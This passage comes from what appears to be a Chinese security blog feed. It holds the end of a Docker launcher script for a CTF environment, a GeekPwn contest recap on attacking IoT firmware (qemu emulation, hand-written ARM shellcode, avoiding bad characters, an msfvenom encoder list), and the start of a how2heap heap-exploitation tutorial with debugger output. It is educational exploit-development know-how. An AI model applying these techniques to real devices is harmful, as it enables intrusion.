<span class="comment"># &#x27;DISPLAY&#x27;: os.environ[&#x27;DISPLAY&#x27;]</span></span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">&#x27;This maybe caused by not completely installed ancypwn.&#x27;</span>)</span><br><span class="line">        print(<span class="string">&#x27;Have you read https://github.com/Escapingbug/ancypwn?&#x27;</span>)</span><br><span class="line">        print()</span><br><span class="line">        <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Set flag, save the container id</span></span><br><span class="line">    <span class="keyword">with</span> open(EXIST_FLAG, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> flag:</span><br><span class="line">        flag.write(running_container.name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Then attach to it, needs to do it in shell since we need</span></span><br><span class="line">    <span class="comment"># shell to do the input and output part(interactive part)</span></span><br><span class="line">    _attach_interactive(running_container.name)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attach_pwn</span>(<span class="params">args</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Attaches to a pwn thread</span></span><br><span class="line"><span class="string">    Just sets needed docker arguments and run it as well</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    container_name = _read_container_name()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># FIXME Is it better that we just exec it with given name?</span></span><br><span class="line">    conts = container.list(filters=&#123;<span class="string">&#x27;name&#x27;</span>:container_name&#125;)</span><br><span class="line">    <span class="keyword">if</span> len(conts) != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> InstallationError(<span class="string">&#x27;Installation seems to be run. There are more than one image called ancypwn&#x27;</span>)</span><br><span class="line">    _attach_interactive(conts[<span class="number">0</span>].name)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">end_pwn</span>(<span class="params">args</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Ends a running thread</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    container_name = _read_container_name()</span><br><span class="line">    conts = container.list(filters=&#123;<span class="string">&#x27;name&#x27;</span>:container_name&#125;)</span><br><span class="line">    <span class="keyword">if</span> len(conts) &lt; <span class="number">1</span>:</span><br><span class="line">        os.remove(EXIST_FLAG)</span><br><span class="line">        <span class="keyword">raise</span> NotRunningException(<span class="string">&#x27;No pwn thread running, corrupted meta info file, deleted&#x27;</span>)</span><br><span class="line">    conts[<span class="number">0</span>].stop()</span><br><span class="line">    conts[<span class="number">0</span>].remove()</span><br><span class="line">    os.remove(EXIST_FLAG)</span><br><span class="line">    <span class="comment"># os.system(&#x27;docker rm &#x27;+conts[0])</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    parse_args()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GeekPwn 参赛记</title>
      <link href="GeekPwn%E5%8F%82%E8%B5%9B%E8%AE%B0.html"/>
      <url>GeekPwn%E5%8F%82%E8%B5%9B%E8%AE%B0.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="GeekPwn-参赛记"><a href="#GeekPwn-参赛记" class="headerlink" title="GeekPwn 参赛记"></a>GeekPwn 参赛记</h2><h3 id="0x01-题记"><a href="#0x01-题记" class="headerlink" title="0x01 题记"></a>0x01 题记</h3><p>迟到的参赛记…</p><p>事情，要从我在360实习的时候说起，其实那个时候 r3kapig 就想法要参加 GeekPwn，于是，我们就分了几个组：</p><p>xxx 和xxx 想搞游戏引擎</p><p>xxx 和 xxx 想搞 office 、wps 阿windows 内核阿 诸如此类…</p><p><a href="https://raw.githubusercontent.com/WinMin/gitpic/master/20181115151437.png" class="gallery-item"><img src="https://raw.githubusercontent.com/WinMin/gitpic/master/20181115151437.png"></a></p><p>没办法，我这种垃圾，只能选择去看 IoT 设备了…</p><h3 id="0x02-经历"><a href="#0x02-经历" class="headerlink" title="0x02 经历"></a>0x02 经历</h3><h4 id="拿不到固件-还配做黑客么？"><a href="#拿不到固件-还配做黑客么？" class="headerlink" title="拿不到固件 还配做黑客么？"></a>拿不到固件 还配做黑客么？</h4><p> 一开始，我们和 w1ther 要搞小米音箱，然后遇到了一个问题，我们俩都没设备拿固件。这就犯愁了，我说要不伯博，去你们学校的实验室看看有没有办法搞吧？</p><p><a href="https://raw.githubusercontent.com/WinMin/gitpic/master/20181115135205.png" class="gallery-item"><img src="https://raw.githubusercontent.com/WinMin/gitpic/master/20181115135205.png"></a></p><p>最后伯博，告诉我们这个他们实验室没办法搞 </p><h4 id="转机"><a href="#转机" class="headerlink" title="转机"></a>转机</h4><p>然后后来得知，此时我们 r3kapig 的金主爸爸 京东的某实验老板 kj大佬也想打 GeekPwn ，于是我们就有了抱大腿的想法…</p><p>于是后面的日子，就变成了…kj -&gt; 固件批量发售商！</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img20181115135829.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img20181115135829.png"></a></p><h4 id="IDA-启动！-IDA-关闭！"><a href="#IDA-启动！-IDA-关闭！" class="headerlink" title="IDA 启动！ IDA 关闭！"></a>IDA 启动！ IDA 关闭！</h4><p>Emmm 拿到的固件都是 ARM 的这个比 某MIPS 好看多了…</p><p><a href="https://raw.githubusercontent.com/WinMin/gitpic/master/20181115140353.png" class="gallery-item"><img src="https://raw.githubusercontent.com/WinMin/gitpic/master/20181115140353.png"></a></p><p>这里膜拜下 Atum ，emmm 如果纯粹为了挖洞 Atum方法是真实用，他把各个 sscanf 阿 system阿 啥函数的引用看了一遍…刷就有洞了….</p><h4 id="DEBUG-…"><a href="#DEBUG-…" class="headerlink" title="DEBUG …"></a>DEBUG …</h4><p>找到了🕳 … 接着就要 debug了！！！</p><p>我们通常两种方法</p><ol><li>设备有调试接口 或者有后面 ，上传 gdbserver</li><li>qemu模拟</li></ol><p>由于我没有设备，所以我们这里用的 qemu 模拟，但是我们 CTF 上的 qemu 模拟，通常指跑一个 bin ，然后我们专门向kj 学习了如何搭建一个 qemu 模拟 arm 系统，这个就相当于你跑了一个 板子了..</p><p>感兴趣的同学可以看 这篇 <a href="https://bestwing.me/%E6%9E%84%E5%BB%BA%E5%B5%8C%E5%85%A5%E5%BC%8Fqemu.html">构建qemu嵌入式</a>：</p><p>当然 MIPS 也是一样的方法，换个 kernel 和 initrd</p><p>当然，跑在 模拟器的同时，你可能需要 patch 一些启动项！</p><h4 id="CODE-EXPLOIT"><a href="#CODE-EXPLOIT" class="headerlink" title="CODE EXPLOIT"></a>CODE EXPLOIT</h4><p>这里会涉及到一点 arm 的shellcode 知识！！！</p><p>一开始，我们使用 Pwntools 的 <a href="http://docs.pwntools.com/en/stable/asm.html">Assembly</a></p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img20181115141358.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img20181115141358.png"></a></p><p>然后出了一丢丢 bug，后面发现是依赖不足.. 然把 <code>binutils-arm-linux-gnueabi binutils-dev binutils-multiarch</code> 这三个一装就好了…</p><p>后面发现 Pwntools 的不足以 或者有问题，于是我们开始 手写 shellcode</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img20181115141802.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img20181115141802.png"></a></p><p>果然还是 google 大法好！</p><p>然后发现了几篇挺好的文章：</p><p><a href="http://phrack.org/issues/66/12.html">http://phrack.org/issues/66/12.html</a></p><p><a href="https://azeria-labs.com/writing-arm-shellcode/">https://azeria-labs.com/writing-arm-shellcode/</a></p><h4 id="badchar-bypass"><a href="#badchar-bypass" class="headerlink" title="badchar bypass"></a>badchar bypass</h4><p>由于是输入的过程中 sscanf 需要 bypass 一些 badchar ，例如 \x00 \x20 诸如此类…于是我们刚开始能不能有现有的编码器可以 encode一下！！！</p><p>例如： msfvenom 然后惊奇的发现！！！没有 arm的？？？？？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -l encoders</span><br><span class="line"></span><br><span class="line">Framework Encoders</span><br><span class="line">==================</span><br><span class="line"></span><br><span class="line">    Name                          Rank       Description</span><br><span class="line">    ----                          ----       -----------</span><br><span class="line">    cmd/<span class="built_in">echo</span>                      good       Echo Command Encoder</span><br><span class="line">    cmd/generic_sh                manual     Generic Shell Variable Substitution Command Encoder</span><br><span class="line">    cmd/ifs                       low        Generic <span class="variable">$&#123;IFS&#125;</span> Substitution Command Encoder</span><br><span class="line">    cmd/perl                      normal     Perl Command Encoder</span><br><span class="line">    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder</span><br><span class="line">    cmd/printf_php_mq             manual     <span class="built_in">printf</span>(1) via PHP magic_quotes Utility Command Encoder</span><br><span class="line">    generic/eicar                 manual     The EICAR Encoder</span><br><span class="line">    generic/none                  normal     The <span class="string">&quot;none&quot;</span> Encoder</span><br><span class="line">    mipsbe/byte_xori              normal     Byte XORi Encoder</span><br><span class="line">    mipsbe/longxor                normal     XOR Encoder</span><br><span class="line">    mipsle/byte_xori              normal     Byte XORi Encoder</span><br><span class="line">    mipsle/longxor                normal     XOR Encoder</span><br><span class="line">    php/base64                    great      PHP Base64 Encoder</span><br><span class="line">    ppc/longxor                   normal     PPC LongXOR Encoder</span><br><span class="line">    ppc/longxor_tag               normal     PPC LongXOR Encoder</span><br><span class="line">    sparc/longxor_tag             normal     SPARC DWORD XOR Encoder</span><br><span class="line">    x64/xor                       normal     XOR Encoder</span><br><span class="line">    x64/zutto_dekiru              manual     Zutto Dekiru</span><br><span class="line">    x86/add_sub                   manual     Add/Sub Encoder</span><br><span class="line">    x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder</span><br><span class="line">    x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder</span><br><span class="line">    x86/avoid_underscore_tolower  manual     Avoid underscore/tolower</span><br><span class="line">    x86/avoid_utf8_tolower        manual     Avoid UTF8/tolower</span><br><span class="line">    x86/bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder</span><br><span class="line">    x86/bmp_polyglot              manual     BMP Polyglot</span><br><span class="line">    x86/call4_dword_xor           normal     Call+4 Dword XOR Encoder</span><br><span class="line">    x86/context_cpuid             manual     CPUID-based Context Keyed Payload Encoder</span><br><span class="line">    x86/context_stat              manual     <span class="built_in">stat</span>(2)-based Context Keyed Payload Encoder</span><br><span class="line">    x86/context_time              manual     time(2)-based Context Keyed Payload Encoder</span><br><span class="line">    x86/countdown                 normal     Single-byte XOR Countdown Encoder</span><br><span class="line">    x86/fnstenv_mov               normal     Variable-length Fnstenv/mov Dword XOR Encoder</span><br><span class="line">    x86/jmp_call_additive         normal     Jump/Call XOR Additive Feedback Encoder</span><br><span class="line">    x86/nonalpha                  low        Non-Alpha Encoder</span><br><span class="line">    x86/nonupper                  low        Non-Upper Encoder</span><br><span class="line">    x86/opt_sub                   manual     Sub Encoder (optimised)</span><br><span class="line">    x86/service                   manual     Register Service</span><br><span class="line">    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder</span><br><span class="line">    x86/single_static_bit         manual     Single Static Bit</span><br><span class="line">    x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder</span><br><span class="line">    x86/unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder</span><br><span class="line"></span><br><span class="line">作者：极客圈</span><br><span class="line">链接：https://www.jianshu.com/p/d0d795eaf429</span><br><span class="line">來源：简书</span><br><span class="line">简书著作权归作者所有，任何形式的转载都请联系作者获得授权并注明出处。</span><br></pre></td></tr></table></figure><p>emmm 好吧手写手写！</p><p>于是我和伯博决定，哪里不行点哪里… 这个指令不行 就换两个指令 助如此类…</p><h4 id="exploit-done"><a href="#exploit-done" class="headerlink" title="exploit done !!!"></a>exploit done !!!</h4><p>emm </p><p><a href="https://raw.githubusercontent.com/WinMin/gitpic/master/20181115143105.png" class="gallery-item"><img src="https://raw.githubusercontent.com/WinMin/gitpic/master/20181115143105.png"></a></p><p>然而这个时候。。我们发现虚拟机打通了 设备打不通！ 后面才发现 emm watch dog 在，打了之后就崩了！！！最后伯博写出了 情理之中，理所应当的exploit</p><p><a href="https://raw.githubusercontent.com/WinMin/gitpic/master/20181115143331.png" class="gallery-item"><img src="https://raw.githubusercontent.com/WinMin/gitpic/master/20181115143331.png"></a></p><p>woc ？？？ 好吧 写到开机启动里</p><p>（ps ：另外一个路由器的 任意命令执行就不写了…没什么坑点）</p><h3 id="0x03-GeekPwn-Shang-Hai"><a href="#0x03-GeekPwn-Shang-Hai" class="headerlink" title="0x03 GeekPwn Shang Hai"></a>0x03 GeekPwn Shang Hai</h3><p>咕咕 伯博…说好的来上海的呢？？？ 被咕咕了…</p><h4 id="签到："><a href="#签到：" class="headerlink" title="签到："></a>签到：</h4><p>签到要拍照片…先是团队 ，对了我们的团队叫 ：小猪矿主 …</p><p>然后紧接着是 个人照…在个人照的时候，摄影师会问你，有个人Pose么？woc 麦香师傅真的是太帅了 舔一波，Atum师傅太强了…</p><p>然后拿了衣服和胸牌就撤了..</p><p><a href="https://raw.githubusercontent.com/WinMin/gitpic/master/20181115144021.png" class="gallery-item"><img src="https://raw.githubusercontent.com/WinMin/gitpic/master/20181115144021.png"></a></p><h4 id="第一天："><a href="#第一天：" class="headerlink" title="第一天："></a>第一天：</h4><p>我们的比赛放在 第二天下午，所以第一天我们是观众。。。</p><p>第一天见到了 蒋昌建老师，蒋昌建老师的 主持一如既往 最强大脑即时感！。</p><p><a href="http://2018.geekpwn.org/images/collection/18.jpeg" class="gallery-item"><img src="http://2018.geekpwn.org/images/collection/18.jpeg"></a></p><p>当了一天观众 …有几个项目挺有意思…</p><p>中午 Atum老板和 他的老板出去吃饭了…</p><p>晚上 kj 老板带我们去吃饭了…然后谈了一点，他之后的想法..</p><p>然后各回各家，回去接着 测试设备…</p><h4 id="第二天"><a href="#第二天" class="headerlink" title="第二天"></a>第二天</h4><p>第二天早上，我们并没有去现场，由于下午就是我们的比赛了,我们又开始测了一次设备，emmm 中间的确避免了许多麻烦，由于最后的exploit都是用shell 脚本写的..我们的得先确认一遍</p><p>下午比赛开始：</p><p>中间原本设计好的 回车日站失效了！！！</p><p>一开始是 某音箱没连wifi， 跪了，打不到</p><p>后面是某款路由器的国内版和国际版弄反了！ 跪了</p><p>最后，又发现 路由器的地址填错了，跪了！！！</p><p>于是乎，现场改 exploit….在最后的四秒 PWNED！</p><p><a href="https://raw.githubusercontent.com/WinMin/gitpic/master/20181115145501.png" class="gallery-item"><img src="https://raw.githubusercontent.com/WinMin/gitpic/master/20181115145501.png"></a></p><p><a href="https://raw.githubusercontent.com/WinMin/gitpic/master/20181115144903.png" class="gallery-item"><img src="https://raw.githubusercontent.com/WinMin/gitpic/master/20181115144903.png"></a></p><p>那个唯一出现在 PPT 上的男人 @w1ther ，让你咕咕！</p><h4 id="颁奖"><a href="#颁奖" class="headerlink" title="颁奖"></a>颁奖</h4><p>最后颁奖的时候，我们拿了两个 一个最佳展示 一个是基于漏洞攻破奖。</p><p><a href="http://s.plusx.cn/plus/immediate/381118/20181025181543780/09560428_b.JPG?sign=f9c3baba79cfc05a536711baeb003899&t=5bee6748" class="gallery-item"><img src="http://s.plusx.cn/plus/immediate/381118/20181025181543780/09560428_b.JPG?sign=f9c3baba79cfc05a536711baeb003899&t=5bee6748"></a></p><h3 id="最后的最后"><a href="#最后的最后" class="headerlink" title="最后的最后"></a>最后的最后</h3><p>感谢 kj 老板！ 也感谢队友们！！！ tql 了</p><p>贴个出道照片吧</p><p><a href="https://raw.githubusercontent.com/WinMin/gitpic/master/20181115145926.png" class="gallery-item"><img src="https://raw.githubusercontent.com/WinMin/gitpic/master/20181115145926.png"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> geekpwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Educational Heap Exploitation</title>
      <link href="Educational_Heap_Exploitation.html"/>
      <url>Educational_Heap_Exploitation.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>通过 how2heap 复习堆利用</p><p>首发于先知社区 <a href="https://xz.aliyun.com/t/2582">https://xz.aliyun.com/t/2582</a></p><h2 id="Educational-Heap-Exploitation"><a href="#Educational-Heap-Exploitation" class="headerlink" title="Educational Heap Exploitation"></a>Educational Heap Exploitation</h2><p><a href="https://github.com/shellphish/how2heap">how2heap</a>这是由 shellphish 团队创建的一个仓库，是用来学习堆利用技术广为周知的地方。    且主要针对 glibc</p><h3 id="0x01-first-fit"><a href="#0x01-first-fit" class="headerlink" title="0x01 first_fit"></a>0x01 first_fit</h3><p>Source:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file doesn&#x27;t demonstrate an attack, but shows the nature of glibc&#x27;s allocator.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;glibc uses a first-fit algorithm to select a free chunk.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;If a chunk is free and large enough, malloc will select this chunk.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This can be exploited in a use-after-free situation.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating 2 buffers. They can be large, don&#x27;t have to be fastbin.\n&quot;</span>);</span><br><span class="line"><span class="keyword">char</span>* a = <span class="built_in">malloc</span>(<span class="number">512</span>);</span><br><span class="line"><span class="keyword">char</span>* b = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line"><span class="keyword">char</span>* c;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st malloc(512): %p\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd malloc(256): %p\n&quot;</span>, b);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;we could continue mallocing here...\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;now let&#x27;s put a string at a that we can read later \&quot;this is A!\&quot;\n&quot;</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(a, <span class="string">&quot;this is A!&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;first allocation %p points to %s\n&quot;</span>, a, a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We don&#x27;t need to free anything again. As long as we allocate less than 512, it will end up at %p\n&quot;</span>, a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;So, let&#x27;s allocate 500 bytes\n&quot;</span>);</span><br><span class="line">c = <span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd malloc(500): %p\n&quot;</span>, c);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And put a different string here, \&quot;this is C!\&quot;\n&quot;</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(c, <span class="string">&quot;this is C!&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd allocation %p points to %s\n&quot;</span>, c, c);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;first allocation %p points to %s\n&quot;</span>, a, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;If we reuse the first allocation, it now holds the data from the third allocation.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们从调试上入手，首先简单对 main 函数下断点。<code>b main</code> 。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814152947.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814152947.png"></a></p><p>程序首先创建了两个 chunk，size分别为 512 和256。然后向chunk a  分别写入字符串 ‘this is A’ 。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; heap</span><br><span class="line">Top Chunk: 0x602320</span><br><span class="line">Last Remainder: 0</span><br><span class="line"></span><br><span class="line">0x602000 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x211,</span><br><span class="line">  fd = 0x2073692073696874,</span><br><span class="line">  bk = 0x2141,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; x/20a 0x602000</span><br><span class="line">0x602000:0x00x211</span><br><span class="line">0x602010:0x20736920736968740x2141</span><br><span class="line">0x602020:0x00x0</span><br><span class="line">0x602030:0x00x0</span><br><span class="line">0x602040:0x00x0</span><br><span class="line">0x602050:0x00x0</span><br><span class="line">0x602060:0x00x0</span><br><span class="line">0x602070:0x00x0</span><br><span class="line">0x602080:0x00x0</span><br><span class="line">0x602090:0x00x0</span><br><span class="line">Pwndbg&gt; x/5s 0x602010</span><br><span class="line">0x602010:<span class="string">&quot;this is A!&quot;</span></span><br><span class="line">0x60201b:<span class="string">&quot;&quot;</span></span><br><span class="line">0x60201c:<span class="string">&quot;&quot;</span></span><br><span class="line">0x60201d:<span class="string">&quot;&quot;</span></span><br><span class="line">0x60201e:</span><br></pre></td></tr></table></figure><p>这个时候我们把 chunk A free掉。由于chunk A 大小为 512 不适于 fastbins 系统会将这个chunk 放入unsortedbin。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814154134.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814154134.png"></a></p><hr><p>基本来源：</p><ol><li>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。</li><li>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。关于top chunk的解释，请参考下面的介绍。</li><li>当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话。</li></ol><p>基本使用情况</p><ol><li>Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO，<strong>即插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取</strong>。</li><li>在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中。</li></ol><hr><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814154346.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814154346.png"></a></p><p> 当程序再一次 malloc 一个大小与我们 free 掉的chunk 大小差不多的 chunk ，系统会优先从 bins 里找到一个合适的 chunk 把他取出来再使用。写入’this is C’</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; heap</span><br><span class="line">Top Chunk: <span class="number">0x602320</span></span><br><span class="line">Last Remainder: <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x602000</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0x0</span>,</span><br><span class="line">  size = <span class="number">0x211</span>,</span><br><span class="line">  fd = <span class="number">0x2073692073696874</span>,</span><br><span class="line">  bk = <span class="number">0x7ffff7002143</span>,</span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>,</span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 